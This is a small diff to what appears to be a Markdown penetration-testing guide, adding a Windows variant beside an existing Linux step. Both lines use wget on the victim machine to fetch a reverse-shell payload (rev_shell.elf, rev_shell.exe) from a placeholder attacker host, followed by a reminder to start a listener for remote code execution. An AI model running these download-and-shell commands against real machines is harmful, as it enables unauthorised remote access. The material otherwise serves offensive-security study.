@@ -344,7 +344,9 @@ In attacking machine:
 
 In the machine being attacked:
 
-`wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf`
+`wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf`  
+
+(*windows*) `wget http://ATTACKING_MACHINE_IP:9000/rev_shell.exe -O rev_shell.exe`
 
 Now remember we need a listener on our shell for RCE:
 
